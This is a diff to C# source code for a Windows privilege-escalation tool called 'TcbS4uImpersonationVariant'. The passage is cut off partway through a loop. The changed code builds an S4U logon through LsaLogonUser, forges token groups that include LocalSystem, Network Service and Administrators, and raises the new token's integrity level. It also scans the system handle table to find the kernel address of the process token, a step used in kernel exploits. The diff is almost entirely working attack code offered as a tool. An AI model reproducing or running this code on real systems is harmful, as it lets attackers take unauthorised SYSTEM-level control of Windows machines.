@@ -7,6 +7,8 @@ using System.Security.Principal;
 
 namespace TcbS4uImpersonationVariant
 {
+    using NTSTATUS = Int32;
+
     class TcbS4uImpersonationVariant
     {
         // Windows Definition
@@ -20,6 +22,19 @@ namespace TcbS4uImpersonationVariant
             FORMAT_MESSAGE_FROM_HMODULE = 0x00000800,
             FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000,
             FORMAT_MESSAGE_ARGUMENT_ARRAY = 0x00002000
+        }
+
+        enum MSV1_0_LOGON_SUBMIT_TYPE
+        {
+            MsV1_0InteractiveLogon = 2,
+            MsV1_0Lm20Logon,
+            MsV1_0NetworkLogon,
+            MsV1_0SubAuthLogon,
+            MsV1_0WorkstationUnlockLogon = 7,
+            MsV1_0S4ULogon = 12,
+            MsV1_0VirtualLogon = 82,
+            MsV1_0NoElevationLogon = 83,
+            MsV1_0LuidLogon = 84
         }
 
         [Flags]
@@ -69,15 +84,15 @@ namespace TcbS4uImpersonationVariant
         [Flags]
         enum SE_GROUP_ATTRIBUTES : uint
         {
-            SE_GROUP_MANDATORY = 0x00000001,
-            SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002,
-            SE_GROUP_ENABLED = 0x00000004,
-            SE_GROUP_OWNER = 0x00000008,
-            SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010,
-            SE_GROUP_INTEGRITY = 0x00000020,
-            SE_GROUP_INTEGRITY_ENABLED = 0x00000040,
-            SE_GROUP_RESOURCE = 0x20000000,
-            SE_GROUP_LOGON_ID = 0xC0000000
+            MANDATORY = 0x00000001,
+            ENABLED_BY_DEFAULT = 0x00000002,
+            ENABLED = 0x00000004,
+            OWNER = 0x00000008,
+            USE_FOR_DENY_ONLY = 0x00000010,
+            INTEGRITY = 0x00000020,
+            INTEGRITY_ENABLED = 0x00000040,
+            RESOURCE = 0x20000000,
+            LOGON_ID = 0xC0000000
         }
 
         enum SYSTEM_INFORMATION_CLASS
@@ -393,187 +408,91 @@ namespace TcbS4uImpersonationVariant
 
         class MSV1_0_S4U_LOGON : IDisposable
         {
-            [StructLayout(LayoutKind.Sequential)]
-            private struct INNER_LSA_UNICODE_STRING
-            {
-                public ushort Length;
-                public ushort MaximumLength;
-                public IntPtr Buffer;
-            }
+            public IntPtr Buffer { get; } = IntPtr.Zero;
+            public int Length { get; } = 0;
 
-            [StructLayout(LayoutKind.Sequential)]
-            private struct INNER_MSV1_0_S4U_LOGON
+            private struct MSV1_0_S4U_LOGON_INNER
             {
-                public int MessageType;
+                public MSV1_0_LOGON_SUBMIT_TYPE MessageType;
                 public uint Flags;
-                public INNER_LSA_UNICODE_STRING UserPrincipalName;
-                public INNER_LSA_UNICODE_STRING DomainName;
+                public UNICODE_STRING UserPrincipalName;
+                public UNICODE_STRING DomainName;
             }
 
-            private INNER_MSV1_0_S4U_LOGON msvS4uLogon =
-                new INNER_MSV1_0_S4U_LOGON();
-            private readonly IntPtr pointer;
-            private readonly int length;
-
-            public MSV1_0_S4U_LOGON(uint flags, string upn, string domain)
+            public MSV1_0_S4U_LOGON(MSV1_0_LOGON_SUBMIT_TYPE type, uint flags, string upn, string domain)
             {
-                byte[] upnBytes = new byte[] { };
-                byte[] domainBytes = new byte[] { };
-                int MsV1_0S4ULogon = 12;
-
-                msvS4uLogon.MessageType = MsV1_0S4ULogon;
-                msvS4uLogon.Flags = flags;
-
-                if (!string.IsNullOrEmpty(upn))
+                int innerStructSize = Marshal.SizeOf(typeof(MSV1_0_S4U_LOGON_INNER));
+                var pUpnBuffer = IntPtr.Zero;
+                var pDomainBuffer = IntPtr.Zero;
+                var innerStruct = new MSV1_0_S4U_LOGON_INNER
                 {
-                    upnBytes = Encoding.Unicode.GetBytes(upn);
-                    msvS4uLogon.UserPrincipalName.Length =
-                        (ushort)upnBytes.Length;
-                    msvS4uLogon.UserPrincipalName.MaximumLength =
-                        (ushort)(upnBytes.Length + 2);
+                    MessageType = type,
+                    Flags = flags
+                };
+                Length = innerStructSize;
+
+                if (string.IsNullOrEmpty(upn))
+                {
+                    innerStruct.UserPrincipalName.Length = 0;
+                    innerStruct.UserPrincipalName.MaximumLength = 0;
                 }
                 else
                 {
-                    msvS4uLogon.UserPrincipalName.Length = 0;
-                    msvS4uLogon.UserPrincipalName.MaximumLength = 0;
+                    innerStruct.UserPrincipalName.Length = (ushort)(upn.Length * 2);
+                    innerStruct.UserPrincipalName.MaximumLength = (ushort)((upn.Length * 2) + 2);
+                    Length += innerStruct.UserPrincipalName.MaximumLength;
+                }
+
+                if (string.IsNullOrEmpty(domain))
+                {
+                    innerStruct.DomainName.Length = 0;
+                    innerStruct.DomainName.MaximumLength = 0;
+                }
+                else
+                {
+                    innerStruct.DomainName.Length = (ushort)(domain.Length * 2);
+                    innerStruct.DomainName.MaximumLength = (ushort)((domain.Length * 2) + 2);
+                    Length += innerStruct.DomainName.MaximumLength;
+                }
+
+                Buffer = Marshal.AllocHGlobal(Length);
+
+                for (var offset = 0; offset < Length; offset++)
+                    Marshal.WriteByte(Buffer, offset, 0);
+
+                if (!string.IsNullOrEmpty(upn))
+                {
+                    if (Environment.Is64BitProcess)
+                        pUpnBuffer = new IntPtr(Buffer.ToInt64() + innerStructSize);
+                    else
+                        pUpnBuffer = new IntPtr(Buffer.ToInt32() + innerStructSize);
+
+                    innerStruct.UserPrincipalName.SetBuffer(pUpnBuffer);
                 }
 
                 if (!string.IsNullOrEmpty(domain))
                 {
-                    domainBytes = Encoding.Unicode.GetBytes(domain);
-                    msvS4uLogon.DomainName.Length =
-                        (ushort)domainBytes.Length;
-                    msvS4uLogon.DomainName.MaximumLength =
-                        (ushort)(domainBytes.Length + 2);
-                }
-                else
-                {
-                    msvS4uLogon.DomainName.Length = 0;
-                    msvS4uLogon.DomainName.MaximumLength = 0;
+                    if (Environment.Is64BitProcess)
+                        pDomainBuffer = new IntPtr(Buffer.ToInt64() + innerStructSize + innerStruct.UserPrincipalName.MaximumLength);
+                    else
+                        pDomainBuffer = new IntPtr(Buffer.ToInt32() + innerStructSize + innerStruct.UserPrincipalName.MaximumLength);
+
+                    innerStruct.DomainName.SetBuffer(pDomainBuffer);
                 }
 
-                length = Marshal.SizeOf(msvS4uLogon) +
-                    msvS4uLogon.UserPrincipalName.MaximumLength +
-                    msvS4uLogon.DomainName.MaximumLength;
-                pointer = Marshal.AllocHGlobal(length);
-                Marshal.Copy(new byte[length], 0, pointer, length);
-
-                IntPtr pUpnString = new IntPtr(
-                    pointer.ToInt64() +
-                    Marshal.SizeOf(msvS4uLogon));
-                IntPtr pDomainString = new IntPtr(
-                    pUpnString.ToInt64() +
-                    msvS4uLogon.UserPrincipalName.MaximumLength);
+                Marshal.StructureToPtr(innerStruct, Buffer, true);
 
                 if (!string.IsNullOrEmpty(upn))
-                {
-                    Marshal.Copy(upnBytes, 0, pUpnString, upnBytes.Length);
-                    msvS4uLogon.UserPrincipalName.Buffer = pUpnString;
-                }
-                else
-                {
-                    msvS4uLogon.UserPrincipalName.Buffer = IntPtr.Zero;
-                }
+                    Marshal.Copy(Encoding.Unicode.GetBytes(upn), 0, pUpnBuffer, upn.Length * 2);
 
                 if (!string.IsNullOrEmpty(domain))
-                {
-                    Marshal.Copy(domainBytes, 0, pDomainString, domainBytes.Length);
-                    msvS4uLogon.DomainName.Buffer = pDomainString;
-                }
-                else
-                {
-                    msvS4uLogon.DomainName.Buffer = IntPtr.Zero;
-                }
-
-                Marshal.StructureToPtr(msvS4uLogon, pointer, true);
-            }
-
-            public MSV1_0_S4U_LOGON(string upn, string domain)
-            {
-                byte[] upnBytes = new byte[] { };
-                byte[] domainBytes = new byte[] { };
-                int MsV1_0S4ULogon = 12;
-
-                msvS4uLogon.MessageType = MsV1_0S4ULogon;
-                msvS4uLogon.Flags = 0;
-
-                if (!string.IsNullOrEmpty(upn))
-                {
-                    upnBytes = Encoding.Unicode.GetBytes(upn);
-                    msvS4uLogon.UserPrincipalName.Length =
-                        (ushort)upnBytes.Length;
-                    msvS4uLogon.UserPrincipalName.MaximumLength =
-                        (ushort)(upnBytes.Length + 2);
-                }
-                else
-                {
-                    msvS4uLogon.UserPrincipalName.Length = 0;
-                    msvS4uLogon.UserPrincipalName.MaximumLength = 0;
-                }
-
-                if (!string.IsNullOrEmpty(domain))
-                {
-                    domainBytes = Encoding.Unicode.GetBytes(domain);
-                    msvS4uLogon.DomainName.Length =
-                        (ushort)domainBytes.Length;
-                    msvS4uLogon.DomainName.MaximumLength =
-                        (ushort)(domainBytes.Length + 2);
-                }
-                else
-                {
-                    msvS4uLogon.DomainName.Length = 0;
-                    msvS4uLogon.DomainName.MaximumLength = 0;
-                }
-
-                length = Marshal.SizeOf(msvS4uLogon) +
-                    msvS4uLogon.UserPrincipalName.MaximumLength +
-                    msvS4uLogon.DomainName.MaximumLength;
-                pointer = Marshal.AllocHGlobal(length);
-                Marshal.Copy(new byte[length], 0, pointer, length);
-
-                IntPtr pUpnString = new IntPtr(
-                    pointer.ToInt64() +
-                    Marshal.SizeOf(msvS4uLogon));
-                IntPtr pDomainString = new IntPtr(
-                    pUpnString.ToInt64() +
-                    msvS4uLogon.UserPrincipalName.MaximumLength);
-
-                if (!string.IsNullOrEmpty(upn))
-                {
-                    Marshal.Copy(upnBytes, 0, pUpnString, upnBytes.Length);
-                    msvS4uLogon.UserPrincipalName.Buffer = pUpnString;
-                }
-                else
-                {
-                    msvS4uLogon.UserPrincipalName.Buffer = IntPtr.Zero;
-                }
-
-                if (!string.IsNullOrEmpty(domain))
-                {
-                    Marshal.Copy(domainBytes, 0, pDomainString, domainBytes.Length);
-                    msvS4uLogon.DomainName.Buffer = pDomainString;
-                }
-                else
-                {
-                    msvS4uLogon.DomainName.Buffer = IntPtr.Zero;
-                }
-
-                Marshal.StructureToPtr(msvS4uLogon, pointer, true);
+                    Marshal.Copy(Encoding.Unicode.GetBytes(domain), 0, pDomainBuffer, domain.Length * 2);
             }
 
             public void Dispose()
             {
-                Marshal.FreeHGlobal(pointer);
-            }
-
-            public IntPtr Pointer()
-            {
-                return pointer;
-            }
-
-            public int Length()
-            {
-                return length;
+                if (Buffer != IntPtr.Zero)
+                    Marshal.FreeHGlobal(Buffer);
             }
         }
 
@@ -645,6 +564,37 @@ namespace TcbS4uImpersonationVariant
             }
         }
 
+        [StructLayout(LayoutKind.Sequential)]
+        struct UNICODE_STRING : IDisposable
+        {
+            public ushort Length;
+            public ushort MaximumLength;
+            private IntPtr buffer;
+
+            public UNICODE_STRING(string s)
+            {
+                Length = (ushort)(s.Length * 2);
+                MaximumLength = (ushort)(Length + 2);
+                buffer = Marshal.StringToHGlobalUni(s);
+            }
+
+            public void Dispose()
+            {
+                Marshal.FreeHGlobal(buffer);
+                buffer = IntPtr.Zero;
+            }
+
+            public void SetBuffer(IntPtr pBuffer)
+            {
+                buffer = pBuffer;
+            }
+
+            public override string ToString()
+            {
+                return Marshal.PtrToStringUni(buffer);
+            }
+        }
+
         // Windows API
         /*
          * advapi32.dll
@@ -662,34 +612,19 @@ namespace TcbS4uImpersonationVariant
         static extern int GetLengthSid(IntPtr pSid);
 
         [DllImport("advapi32.dll", SetLastError = true)]
-        static extern bool GetTokenInformation(
-            IntPtr TokenHandle,
-            TOKEN_INFORMATION_CLASS TokenInformationClass,
-            IntPtr TokenInformation,
-            int TokenInformationLength,
-            out int ReturnLength);
-
-        [DllImport("advapi32.dll", SetLastError = true)]
         static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
 
         [DllImport("advapi32.dll")]
         static extern int LsaClose(IntPtr PolicyHandle);
 
         [DllImport("advapi32")]
-        public static extern int LsaNtStatusToWinError(int NTSTATUS);
+        public static extern int LsaNtStatusToWinError(NTSTATUS NTSTATUS);
 
         [DllImport("advapi32.dll", SetLastError = true)]
         static extern bool OpenProcessToken(
             IntPtr hProcess,
             TokenAccessFlags DesiredAccess,
             out IntPtr hToken);
-
-        [DllImport("advapi32.dll", SetLastError = true)]
-        static extern bool SetTokenInformation(
-            IntPtr TokenHandle,
-            TOKEN_INFORMATION_CLASS TokenInformationClass,
-            IntPtr TokenInformation,
-            int TokenInformationLength);
 
         /*
          * kernel32.dll
@@ -729,9 +664,6 @@ namespace TcbS4uImpersonationVariant
             IntPtr Arguments);
 
         [DllImport("kernel32.dll", SetLastError = true)]
-        static extern int GetCurrentThreadId();
-
-        [DllImport("kernel32.dll", SetLastError = true)]
         static extern IntPtr LocalFree(IntPtr hMem);
 
         [DllImport("kernel32.dll", SetLastError = true)]
@@ -740,58 +672,72 @@ namespace TcbS4uImpersonationVariant
             bool bInheritHandle,
             int processId);
 
+        [DllImport("kernel32.dll")]
+        public static extern void SetLastError(int dwErrCode);
+
         /*
          * ntdll.dll
          */
+        [DllImport("ntdll.dll")]
+        static extern NTSTATUS NtQueryInformationToken(
+            IntPtr TokenHandle,
+            TOKEN_INFORMATION_CLASS TokenInformationClass,
+            IntPtr TokenInformation,
+            uint TokenInformationLength,
+            out uint ReturnLength);
+
         [DllImport("ntdll.dll", SetLastError = true)]
         static extern int NtQuerySystemInformation(
             SYSTEM_INFORMATION_CLASS SystemInformationClass,
             IntPtr SystemInformation,
-            int SystemInformationLength,
-            ref int ReturnLength);
+            uint SystemInformationLength,
+            out uint ReturnLength);
+
+        [DllImport("ntdll.dll")]
+        static extern NTSTATUS NtSetInformationToken(
+            IntPtr TokenHandle,
+            TOKEN_INFORMATION_CLASS TokenInformationClass,
+            IntPtr TokenInformation,
+            uint TokenInformationLength);
 
         /*
          * secur32.dll
          */
         [DllImport("secur32.dll", SetLastError = false)]
-        static extern int LsaConnectUntrusted(out IntPtr LsaHandle);
+        static extern NTSTATUS LsaConnectUntrusted(out IntPtr LsaHandle);
 
         [DllImport("secur32.dll", SetLastError = false)]
-        public static extern int LsaFreeReturnBuffer(IntPtr buffer);
+        static extern NTSTATUS LsaFreeReturnBuffer(IntPtr buffer);
 
-        [DllImport("Secur32.dll", SetLastError = true)]
-        static extern int LsaLogonUser(
+        [DllImport("secur32.dll")]
+        static extern NTSTATUS LsaLogonUser(
             IntPtr LsaHandle,
-            ref LSA_STRING OriginName,
+            in LSA_STRING OriginName,
             SECURITY_LOGON_TYPE LogonType,
             uint AuthenticationPackage,
             IntPtr AuthenticationInformation,
-            int AuthenticationInformationLength,
-            IntPtr /*ref TOKEN_GROUPS*/ pLocalGroups,
-            ref TOKEN_SOURCE SourceContext,
+            uint AuthenticationInformationLength,
+            in TOKEN_GROUPS LocalGroups,
+            in TOKEN_SOURCE SourceContext,
             out IntPtr ProfileBuffer,
-            out int ProfileBufferLength,
+            out uint ProfileBufferLength,
             out LUID LogonId,
-            IntPtr /*out IntPtr Token*/ pToken,
+            IntPtr Token, // [out] PHANDLE
             out QUOTA_LIMITS Quotas,
-            out int SubStatus);
+            out NTSTATUS SubStatus);
 
-        [DllImport("Secur32.dll", SetLastError = true)]
-        static extern int LsaLookupAuthenticationPackage(
+        [DllImport("secur32.dll", SetLastError = true)]
+        static extern NTSTATUS LsaLookupAuthenticationPackage(
             IntPtr LsaHandle,
-            ref LSA_STRING PackageName,
+            in LSA_STRING PackageName,
             out uint AuthenticationPackage);
 
         // Windows Consts
-        const int STATUS_SUCCESS = 0;
+        const NTSTATUS STATUS_SUCCESS = 0;
         static readonly int STATUS_INFO_LENGTH_MISMATCH = Convert.ToInt32("0xC0000004", 16);
-        const int ERROR_BAD_LENGTH = 0x00000018;
-        const int ERROR_INSUFFICIENT_BUFFER = 0x0000007A;
+        static readonly NTSTATUS STATUS_BUFFER_TOO_SMALL = Convert.ToInt32("0xC0000023", 16);
         static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
         const string MSV1_0_PACKAGE_NAME = "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0";
-        const string LOCAL_SYSTEM_RID = "S-1-5-18";
-        const string DOMAIN_ALIAS_RID_ADMINS = "S-1-5-32-544";
-        const string TRUSTED_INSTALLER_RID = "S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464";
 
         // User define Consts
         [Flags]
@@ -836,353 +782,210 @@ namespace TcbS4uImpersonationVariant
         }
 
         // User define functions
-        static IntPtr GetMsvS4uLogonToken(
-            string username,
-            string domain,
-            SECURITY_LOGON_TYPE type)
+        static bool AdjustTokenIntegrityLevel(IntPtr hToken)
         {
-            int error;
-            int ntstatus;
-            var pkgName = new LSA_STRING(MSV1_0_PACKAGE_NAME);
-            var tokenSource = new TOKEN_SOURCE("User32");
+            NTSTATUS ntstatus;
+            IntPtr pDataBuffer;
+            var nDataSize = (uint)Marshal.SizeOf(typeof(TOKEN_MANDATORY_LABEL));
+            var status = false;
 
-            Console.WriteLine("[>] Trying to MSV S4U logon.");
-
-            ntstatus = LsaConnectUntrusted(out IntPtr hLsa);
-
-            if (ntstatus != STATUS_SUCCESS)
+            do
             {
-                error = LsaNtStatusToWinError(ntstatus);
-                Console.WriteLine("[-] Failed to connect lsa store.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+                pDataBuffer = Marshal.AllocHGlobal((int)nDataSize);
+                ntstatus = NtQueryInformationToken(
+                    WindowsIdentity.GetCurrent().Token,
+                    TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
+                    pDataBuffer,
+                    nDataSize,
+                    out nDataSize);
 
-                return IntPtr.Zero;
+                if (ntstatus != STATUS_SUCCESS)
+                    Marshal.FreeHGlobal(pDataBuffer);
+            } while (ntstatus == STATUS_BUFFER_TOO_SMALL);
+
+            if (ntstatus == STATUS_SUCCESS)
+            {
+                ntstatus = NtSetInformationToken(
+                    hToken,
+                    TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
+                    pDataBuffer,
+                    nDataSize);
+                status = (ntstatus == STATUS_SUCCESS);
+                Marshal.FreeHGlobal(pDataBuffer);
             }
 
-            ntstatus = LsaLookupAuthenticationPackage(
-                hLsa,
-                ref pkgName,
-                out uint authnPkg);
+            return status;
+        }
 
-            if (ntstatus != STATUS_SUCCESS)
+
+        static bool CompareIgnoreCase(string strA, string strB)
+        {
+            return (string.Compare(strA, strB, StringComparison.OrdinalIgnoreCase) == 0);
+        }
+
+
+
+
+
+        public static IntPtr GetMsvS4uLogonToken(string upn, string domain)
+        {
+            var hS4uLogonToken = IntPtr.Zero;
+
+            do
             {
-                error = LsaNtStatusToWinError(ntstatus);
-                Console.WriteLine("[-] Failed to lookup auth package.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
-                LsaClose(hLsa);
+                var pkgName = new LSA_STRING(MSV1_0_PACKAGE_NAME);
+                var tokenGroups = new TOKEN_GROUPS(5);
 
-                return IntPtr.Zero;
-            }
+                NTSTATUS ntstatus = LsaConnectUntrusted(out IntPtr hLsa);
 
-            if (!ConvertStringSidToSid(
-                DOMAIN_ALIAS_RID_ADMINS,
-                out IntPtr pAdminGroup))
-            {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to get Administrator domain SID.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+                if (ntstatus != STATUS_SUCCESS)
+                {
+                    SetLastError(LsaNtStatusToWinError(ntstatus));
+                    break;
+                }
 
-                return IntPtr.Zero;
-            }
+                ntstatus = LsaLookupAuthenticationPackage(hLsa, in pkgName, out uint authnPkg);
 
-            if (!ConvertStringSidToSid(
-                LOCAL_SYSTEM_RID,
-                out IntPtr pLocalSystem))
-            {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to get local system SID.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+                if (ntstatus != STATUS_SUCCESS)
+                {
+                    LsaClose(hLsa);
+                    SetLastError(LsaNtStatusToWinError(ntstatus));
+                    break;
+                }
 
-                return IntPtr.Zero;
-            }
+                ConvertStringSidToSid("S-1-1-0", out IntPtr pEveryoneSid);
+                ConvertStringSidToSid("S-1-5-11", out IntPtr pAuthenticatedUsersSid);
+                ConvertStringSidToSid("S-1-5-18", out IntPtr pLocalSystemSid);
+                ConvertStringSidToSid("S-1-5-20", out IntPtr pNetworkServiceSid);
+                ConvertStringSidToSid("S-1-5-32-544", out IntPtr pAdminSid);
 
-            if (!ConvertStringSidToSid(
-                TRUSTED_INSTALLER_RID,
-                out IntPtr pTrustedInstaller))
-            {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to get TrustedInstaller SID.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+                tokenGroups.Groups[0].Sid = pEveryoneSid;
+                tokenGroups.Groups[0].Attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
+                tokenGroups.Groups[1].Sid = pAuthenticatedUsersSid;
+                tokenGroups.Groups[1].Attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
+                tokenGroups.Groups[2].Sid = pLocalSystemSid;
+                tokenGroups.Groups[2].Attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
+                tokenGroups.Groups[3].Sid = pNetworkServiceSid;
+                tokenGroups.Groups[3].Attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
+                tokenGroups.Groups[4].Sid = pAdminSid;
+                tokenGroups.Groups[4].Attributes = (int)(SE_GROUP_ATTRIBUTES.OWNER | SE_GROUP_ATTRIBUTES.ENABLED);
 
-                return IntPtr.Zero;
-            }
+                using (var msv = new MSV1_0_S4U_LOGON(MSV1_0_LOGON_SUBMIT_TYPE.MsV1_0S4ULogon, 0, upn, domain))
+                {
+                    IntPtr pTokenBuffer = Marshal.AllocHGlobal(IntPtr.Size);
+                    var originName = new LSA_STRING("S4U");
+                    var tokenSource = new TOKEN_SOURCE("User32");
+                    ntstatus = LsaLogonUser(
+                        hLsa,
+                        in originName,
+                        SECURITY_LOGON_TYPE.Network,
+                        authnPkg,
+                        msv.Buffer,
+                        (uint)msv.Length,
+                        in tokenGroups,
+                        in tokenSource,
+                        out IntPtr ProfileBuffer,
+                        out uint _,
+                        out LUID _,
+                        pTokenBuffer,
+                        out QUOTA_LIMITS _,
+                        out NTSTATUS _);
+                    LsaFreeReturnBuffer(ProfileBuffer);
+                    LsaClose(hLsa);
 
-            var tokenGroups = new TOKEN_GROUPS(3);
+                    if (ntstatus != STATUS_SUCCESS)
+                        SetLastError(LsaNtStatusToWinError(ntstatus));
+                    else
+                        hS4uLogonToken = Marshal.ReadIntPtr(pTokenBuffer);
 
-            tokenGroups.Groups[0].Sid = pAdminGroup;
-            tokenGroups.Groups[0].Attributes = (uint)(
-                SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED |
-                SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED_BY_DEFAULT |
-                SE_GROUP_ATTRIBUTES.SE_GROUP_MANDATORY);
-            tokenGroups.Groups[1].Sid = pLocalSystem;
-            tokenGroups.Groups[1].Attributes = (uint)(
-                SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED |
-                SE_GROUP_ATTRIBUTES.SE_GROUP_MANDATORY);
-            tokenGroups.Groups[2].Sid = pTrustedInstaller;
-            tokenGroups.Groups[2].Attributes = (uint)(
-                SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED |
-                SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED_BY_DEFAULT |
-                SE_GROUP_ATTRIBUTES.SE_GROUP_MANDATORY);
+                    Marshal.FreeHGlobal(pTokenBuffer);
+                }
 
-            var pTokenGroups = Marshal.AllocHGlobal(Marshal.SizeOf(tokenGroups));
-            Marshal.StructureToPtr(tokenGroups, pTokenGroups, true);
+                LocalFree(pEveryoneSid);
+                LocalFree(pAuthenticatedUsersSid);
+                LocalFree(pLocalSystemSid);
+                LocalFree(pNetworkServiceSid);
+                LocalFree(pAdminSid);
+            } while (false);
 
-            var msvS4uLogon = new MSV1_0_S4U_LOGON(username, domain);
-            var originName = new LSA_STRING("S4U");
-            var pS4uTokenBuffer = Marshal.AllocHGlobal(IntPtr.Size);
-
-            ntstatus = LsaLogonUser(
-                hLsa,
-                ref originName,
-                type,
-                authnPkg,
-                msvS4uLogon.Pointer(),
-                msvS4uLogon.Length(),
-                pTokenGroups,
-                ref tokenSource,
-                out IntPtr profileBuffer,
-                out int profileBufferLength,
-                out LUID logonId,
-                pS4uTokenBuffer,
-                out QUOTA_LIMITS quotas,
-                out int subStatus);
-
-            msvS4uLogon.Dispose();
-            Marshal.FreeHGlobal(pTokenGroups);
-            LsaFreeReturnBuffer(profileBuffer);
-            LsaClose(hLsa);
-
-            var hS4uToken = Marshal.ReadIntPtr(pS4uTokenBuffer);
-            Marshal.FreeHGlobal(pS4uTokenBuffer);
-
-            if (ntstatus != STATUS_SUCCESS)
-            {
-                error = LsaNtStatusToWinError(ntstatus);
-                Console.WriteLine("[-] Failed to S4U logon.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, true));
-
-                return IntPtr.Zero;
-            }
-
-            IntPtr hCurrentToken = WindowsIdentity.GetCurrent().Token;
-            var pIntegrity = GetInformationFromToken(
-                hCurrentToken,
-                TOKEN_INFORMATION_CLASS.TokenIntegrityLevel);
-
-            if (pIntegrity == IntPtr.Zero)
-                return IntPtr.Zero;
-
-            var mandatoryLabel = (TOKEN_MANDATORY_LABEL)Marshal.PtrToStructure(
-                pIntegrity, typeof(TOKEN_MANDATORY_LABEL));
-            var lengthSid = GetLengthSid(mandatoryLabel.Label.Sid);
-
-            if (!SetTokenInformation(
-                hS4uToken,
-                TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
-                pIntegrity,
-                Marshal.SizeOf(mandatoryLabel) + lengthSid))
-            {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to adjust integrity level for S4U token.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
-
-                CloseHandle(hS4uToken);
-                hS4uToken = IntPtr.Zero;
-            }
-            else
-            {
-                Console.WriteLine("[+] S4U logon is successful.");
-            }
-
-            return hS4uToken;
+            return hS4uLogonToken;
         }
 
 
         static IntPtr GetCurrentProcessTokenPointer()
         {
-            int error;
             int ntstatus;
+            IntPtr pInfoBuffer;
+            uint nInfoLength = 1024;
+            IntPtr hToken = WindowsIdentity.GetCurrent().Token;
             var pObject = IntPtr.Zero;
 
-            if (!OpenProcessToken(
-                Process.GetCurrentProcess().Handle,
-                TokenAccessFlags.MAXIMUM_ALLOWED,
-                out IntPtr hToken))
-            {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to open current process token.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
-
-                return IntPtr.Zero;
-            }
-
-            Console.WriteLine("[+] Got a handle of current process token.");
-            Console.WriteLine("    |-> hToken: 0x{0}", hToken.ToString("X"));
-            Console.WriteLine("[>] Trying to retrieve system information.");
-
-            int systemInformationLength = 1024;
-            IntPtr infoBuffer;
-
             do
             {
-                infoBuffer = Marshal.AllocHGlobal(systemInformationLength);
-                ZeroMemory(infoBuffer, systemInformationLength);
-
+                pInfoBuffer = Marshal.AllocHGlobal((int)nInfoLength);
                 ntstatus = NtQuerySystemInformation(
                     SYSTEM_INFORMATION_CLASS.SystemExtendedHandleInformation,
-                    infoBuffer,
-                    systemInformationLength,
-                    ref systemInformationLength);
+                    pInfoBuffer,
+                    nInfoLength,
+                    out nInfoLength);
 
                 if (ntstatus != STATUS_SUCCESS)
-                    Marshal.FreeHGlobal(infoBuffer);
+                    Marshal.FreeHGlobal(pInfoBuffer);
             } while (ntstatus == STATUS_INFO_LENGTH_MISMATCH);
 
-            CloseHandle(hToken);
-
-            if (ntstatus != STATUS_SUCCESS)
+            if (ntstatus == STATUS_SUCCESS)
             {
-                Console.WriteLine("[-] Failed to get system information.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus, true));
+                var nEntryCount = Marshal.ReadInt32(pInfoBuffer);
+                var pid = Process.GetCurrentProcess().Id;
+                var nEntrySize = Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));
 
-                return IntPtr.Zero;
-            }
-
-            var entryCount = Marshal.ReadInt32(infoBuffer);
-            Console.WriteLine("[+] Got {0} entries.", entryCount);
-
-            var pid = Process.GetCurrentProcess().Id;
-            var entry = new SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX();
-            var entrySize = Marshal.SizeOf(entry);
-            var pEntryOffset = new IntPtr(infoBuffer.ToInt64() + IntPtr.Size * 2);
-            IntPtr uniqueProcessId;
-            IntPtr handleValue;
-
-            Console.WriteLine("[>] Searching our process entry (PID = {0}).", pid);
-
-            for (var idx = 0; idx < entryCount; idx++)
-            {
-                entry = (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)Marshal.PtrToStructure(
-                    pEntryOffset,
-                    entry.GetType());
-                uniqueProcessId = entry.UniqueProcessId;
-                handleValue = entry.HandleValue;
-
-                if (uniqueProcessId == new IntPtr(pid) && handleValue == hToken)
+                for (var idx = 0; idx < nEntryCount; idx++)
                 {
-                    pObject = entry.Object;
-                    Console.WriteLine("[+] Got our entry.");
-                    Console.WriteLine("    |-> Object: 0x{0}", pObject.ToString("X16"));
-                    Console.WriteLine("    |-> UniqueProcessId: {0}", uniqueProcessId);
-                    Console.WriteLine("    |-> HandleValue: 0x{0}", handleValue.ToString("X"));
+                    IntPtr pEntryBuffer;
 
-                    break;
+                    if (Environment.Is64BitProcess)
+                        pEntryBuffer = new IntPtr(pInfoBuffer.ToInt64() + (IntPtr.Size * 2) + (nEntrySize * idx));
